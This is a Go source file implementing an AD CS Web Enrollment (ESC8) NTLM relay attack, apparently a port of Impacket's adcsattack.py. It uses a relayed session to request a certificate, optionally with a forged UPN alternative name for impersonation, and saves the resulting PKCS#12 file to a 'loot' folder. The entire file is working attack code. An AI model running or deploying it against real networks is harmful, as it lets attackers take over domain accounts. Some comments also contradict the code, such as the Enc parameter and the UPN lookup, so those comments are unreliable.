// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package relay

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"

	"software.sslmate.com/src/go-pkcs12"
)

// adcsElevated tracks already-attacked users to prevent duplicate enrollment.
// Matches Impacket's global ELEVATED list.
var (
	adcsElevated   = make(map[string]bool)
	adcsElevatedMu sync.Mutex
)

// ADCSAttack implements the ADCS ESC8 relay attack.
// Requests a certificate via relayed HTTP session to AD CS Web Enrollment (/certsrv/certfnsh.asp).
// Matches Impacket's adcsattack.py behavior.
type ADCSAttack struct{}

func (a *ADCSAttack) Name() string { return "adcs" }

func (a *ADCSAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*HTTPRelayClient)
	if !ok {
		return fmt.Errorf("ADCS attack requires HTTP session (got %T)", session)
	}

	username := config.relayedUser
	domain := config.relayedDomain

	// Check if already attacked
	adcsElevatedMu.Lock()
	key := strings.ToUpper(fmt.Sprintf("%s\\%s", domain, username))
	if adcsElevated[key] {
		adcsElevatedMu.Unlock()
		log.Printf("[*] Skipping user %s since attack was already performed", key)
		return nil
	}
	adcsElevated[key] = true
	adcsElevatedMu.Unlock()

	// Generate RSA 4096-bit key pair
	log.Printf("[*] Generating RSA key...")
	privKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return fmt.Errorf("generate RSA key: %v", err)
	}

	// Determine template: Machine for computer accounts, User for regular users
	template := config.Template
	if template == "" {
		if strings.HasSuffix(username, "$") {
			template = "Machine"
		} else {
			template = "User"
		}
	}

	// Generate CSR
	log.Printf("[*] Generating CSR...")
	csrPEM, err := generateCSR(privKey, username, config.AltName)
	if err != nil {
		return fmt.Errorf("generate CSR: %v", err)
	}

	// URL-encode CSR matching Impacket: strip PEM headers/newlines, + → %2b, spaces → +
	csrEncoded := encodeCSRForADCS(csrPEM)
	log.Printf("[*] CSR generated!")

	// Build certificate attributes
	certAttrib := fmt.Sprintf("CertificateTemplate:%s", template)
	if config.AltName != "" {
		certAttrib += fmt.Sprintf("%%0d%%0aSAN:upn=%s", config.AltName)
	}

	// POST to /certsrv/certfnsh.asp
	body := fmt.Sprintf("Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=",
		csrEncoded, certAttrib)

	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}

	log.Printf("[*] Getting certificate...")

	resp, err := client.DoRequest("POST", "/certsrv/certfnsh.asp", body, headers)
	if err != nil {
		return fmt.Errorf("POST /certsrv/certfnsh.asp: %v", err)
	}

	respBody, err := io.ReadAll(resp.Body)
	resp.Body.Close() // Close immediately to return connection to pool for next request
	if err != nil {
		return fmt.Errorf("read response: %v", err)
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("error getting certificate (status %d). Make sure you have entered valid certificate template", resp.StatusCode)
	}

	// Extract ReqID from HTML response
	re := regexp.MustCompile(`certnew\.cer\?ReqID=(\d+)&`)
	matches := re.FindSubmatch(respBody)
	if len(matches) < 2 {
		return fmt.Errorf("error obtaining certificate — no ReqID in response")
	}
	reqID := string(matches[1])

	// Download the certificate (matches Impacket: no Enc parameter)
	certResp, err := client.DoRequest("GET", fmt.Sprintf("/certsrv/certnew.cer?ReqID=%s&Enc=b64", reqID), "", nil)
	if err != nil {
		return fmt.Errorf("GET certificate: %v", err)
	}

	certPEM, err := io.ReadAll(certResp.Body)
	certResp.Body.Close() // Close immediately
	if err != nil {
		return fmt.Errorf("read certificate: %v", err)
	}

	log.Printf("[+] GOT CERTIFICATE! ID %s", reqID)

	// Parse PEM certificate
	block, _ := pem.Decode(certPEM)
	if block == nil {
		return fmt.Errorf("failed to decode PEM certificate")
	}

	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return fmt.Errorf("parse certificate: %v", err)
	}

	// Export as PKCS#12 (.pfx)
	pfxData, err := pkcs12.Modern.Encode(privKey, cert, nil, "")
	if err != nil {
		return fmt.Errorf("encode PKCS12: %v", err)
	}

	// Determine filename: username → certificate identity → "certificate_<id>" (matches Impacket fallback)
	pfxName := username
	if pfxName == "" {
		pfxName = extractCertificateIdentity(cert)
	}
	if pfxName == "" {
		pfxName = fmt.Sprintf("certificate_%s", reqID)
	}
	pfxFilename := sanitizeFilename(pfxName) + ".pfx"
	outputPath := filepath.Join(config.LootDir, pfxFilename)

	log.Printf("[*] Writing PKCS#12 certificate to %s", outputPath)

	if err := os.MkdirAll(config.LootDir, 0755); err != nil {
		log.Printf("[!] Unable to create loot directory, printing B64 of certificate instead")
		log.Printf("[*] Base64-encoded PKCS#12 certificate (%s):\n%s", pfxFilename,
			base64.StdEncoding.EncodeToString(pfxData))
		return nil
	}

	if err := os.WriteFile(outputPath, pfxData, 0600); err != nil {
		log.Printf("[!] Unable to write certificate to file, printing B64 instead")
		log.Printf("[*] Base64-encoded PKCS#12 certificate (%s):\n%s", pfxFilename,
			base64.StdEncoding.EncodeToString(pfxData))
		return nil
	}

	log.Printf("[+] Certificate successfully written to %s", outputPath)

	if config.AltName != "" {
		log.Printf("[*] This certificate can also be used for user: %s", config.AltName)
	}

	return nil
}

// generateCSR creates a PKCS#10 certificate signing request.
// Subject CN = username, optionally adds UPN SAN extension for altName.
func generateCSR(key *rsa.PrivateKey, cn string, altName string) ([]byte, error) {
	template := &x509.CertificateRequest{
		Subject: pkix.Name{
			CommonName: cn,
		},
		SignatureAlgorithm: x509.SHA256WithRSA,
	}

	// Add Subject Alternative Name with UPN OID (1.3.6.1.4.1.311.20.2.3) if altName set
	if altName != "" {
		upnSAN, err := buildUPNSANExtension(altName)
		if err != nil {
			return nil, fmt.Errorf("build UPN SAN: %v", err)
		}
		template.ExtraExtensions = append(template.ExtraExtensions, upnSAN)
	}

	csrDER, err := x509.CreateCertificateRequest(rand.Reader, template, key)
	if err != nil {
		return nil, fmt.Errorf("create CSR: %v", err)
	}

	csrPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE REQUEST",
		Bytes: csrDER,
	})

	return csrPEM, nil
}

// buildUPNSANExtension builds the SubjectAltName extension with a UPN otherName.
// OID: 2.5.29.17 (SubjectAltName), containing otherName with UPN OID 1.3.6.1.4.1.311.20.2.3.
func buildUPNSANExtension(upn string) (pkix.Extension, error) {
	// UPN OID: 1.3.6.1.4.1.311.20.2.3
	upnOID := []int{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}

	// Encode UPN as UTF8String
	utf8Value := make([]byte, 2+len(upn))
	utf8Value[0] = 0x0c // UTF8String tag
	utf8Value[1] = byte(len(upn))
	copy(utf8Value[2:], upn)

	// Build otherName: [0] EXPLICIT OID, [0] EXPLICIT value
	// otherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }
	// Wrapped in GeneralName [0] IMPLICIT
	oidBytes := encodeOID(upnOID)
	contextValue := wrapASN1(0xa0, utf8Value) // [0] EXPLICIT UTF8String

	otherNameContent := append(oidBytes, contextValue...)
	otherName := wrapASN1(0xa0, otherNameContent) // [0] IMPLICIT otherName in GeneralNames

	// Wrap in SEQUENCE (GeneralNames)
	generalNames := wrapASN1(0x30, otherName)

	return pkix.Extension{
		Id:    []int{2, 5, 29, 17}, // SubjectAltName OID
		Value: generalNames,
	}, nil
}

// encodeOID encodes an ASN.1 OID.
func encodeOID(oid []int) []byte {
	if len(oid) < 2 {
		return nil
	}

	// First two components: 40*first + second
	var encoded []byte
	encoded = append(encoded, byte(40*oid[0]+oid[1]))

	for i := 2; i < len(oid); i++ {
		encoded = append(encoded, encodeBase128(oid[i])...)
	}

	// Wrap in OID tag (0x06)
	result := []byte{0x06, byte(len(encoded))}
	result = append(result, encoded...)
	return result
}

// encodeBase128 encodes an integer in base-128 for ASN.1 OID sub-identifiers.
func encodeBase128(val int) []byte {
	if val < 128 {
		return []byte{byte(val)}
	}

	var result []byte
	result = append(result, byte(val&0x7f))
	val >>= 7
	for val > 0 {
		result = append(result, byte(val&0x7f|0x80))
		val >>= 7
	}

	// Reverse
	for i, j := 0, len(result)-1; i < j; i, j = i+1, j-1 {
		result[i], result[j] = result[j], result[i]
	}
	return result
}

// wrapASN1 wraps data in an ASN.1 TLV with the given tag.
func wrapASN1(tag byte, data []byte) []byte {
	length := len(data)
	var result []byte
	result = append(result, tag)

	if length < 128 {
		result = append(result, byte(length))
	} else if length < 256 {
		result = append(result, 0x81, byte(length))
	} else {
		result = append(result, 0x82, byte(length>>8), byte(length))
	}

	result = append(result, data...)
	return result
}

// encodeCSRForADCS encodes a PEM CSR for submission to AD CS /certsrv/certfnsh.asp.
// Matches Impacket: strip PEM headers/newlines, + → %2b, spaces → +.
func encodeCSRForADCS(csrPEM []byte) string {
	s := string(csrPEM)
	// Strip PEM headers
	s = strings.ReplaceAll(s, "-----BEGIN CERTIFICATE REQUEST-----", "")
	s = strings.ReplaceAll(s, "-----END CERTIFICATE REQUEST-----", "")
	// Remove newlines
	s = strings.ReplaceAll(s, "\n", "")
	s = strings.ReplaceAll(s, "\r", "")
	// URL encode: + → %2b, space → +
	s = strings.ReplaceAll(s, "+", "%2b")
	s = strings.ReplaceAll(s, " ", "+")
	return s
}

// extractCertificateIdentity extracts an identity string from a certificate.
// Tries CN first, then SAN UPN, then SAN DNS names. Matches Impacket's _extract_certificate_identity.
func extractCertificateIdentity(cert *x509.Certificate) string {
	// Try CN
	if cert.Subject.CommonName != "" {
		return strings.TrimSpace(cert.Subject.CommonName)
	}

	// Try SAN DNS names
	for _, dns := range cert.DNSNames {
		dns = strings.TrimSpace(dns)
		if dns != "" {
			return dns
		}
	}

	return ""
}

// sanitizeFilename removes unsafe characters from a filename.
// Matches Impacket's _sanitize_filename.
func sanitizeFilename(name string) string {
	re := regexp.MustCompile(`[^A-Za-z0-9._-]`)
	sanitized := re.ReplaceAllString(name, "_")
	sanitized = strings.Trim(sanitized, "._")
	return sanitized
}
